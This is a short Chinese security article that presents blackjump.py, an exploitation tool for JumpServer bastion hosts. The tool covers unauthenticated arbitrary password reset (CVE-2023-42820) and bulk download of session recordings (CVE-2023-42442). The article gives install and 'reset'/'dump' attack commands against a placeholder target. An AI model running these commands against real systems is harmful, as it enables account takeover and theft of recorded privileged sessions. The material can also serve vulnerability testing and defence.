#  JumpServer 堡垒机未授权综合漏洞利用   
 黑白之道   2023-12-16 10:05  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
### 介绍  
  
JumpServer 堡垒机综合漏洞利用  
-  未授权任意用户密码重置 (CVE-2023-42820)  
  
-  未授权一键下载所有操作录像 (CVE-2023-42442)  
  
## 安装  
```
python3 -m pip install -r requirements.txt
```  
## 使用  
- CVE-2023-42820: 如果知道目标的用户名和邮箱可以指定 --user  
 和 --email  
 参数  
  
```
python3 blackjump.py reset https://vulerability
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1aK8uygNVPNaKD51HmfomZZ7fkZgXbdV0vR4l9ibrLBhBGwS51WQSHI4fDibpuwn2x0UWBU50CS3Yg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
- CVE-2023-42442: output/  
 目录下的 <uuid4>.tar  
 文件扔进   
jumpserver播放器播放即可  
  
```
python3 blackjump.py dump https://vulerability
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1aK8uygNVPNaKD51HmfomZg0LBfmoCbcTk0ZDBPAFZibylqib3W3FwDhPkOzHS71abrKZS4wicTboiaw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
- 帮助  
  
```
python3 blackjump.py {reset,dump} -h
```  
  
> **文章来源：HACK之道**  
  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
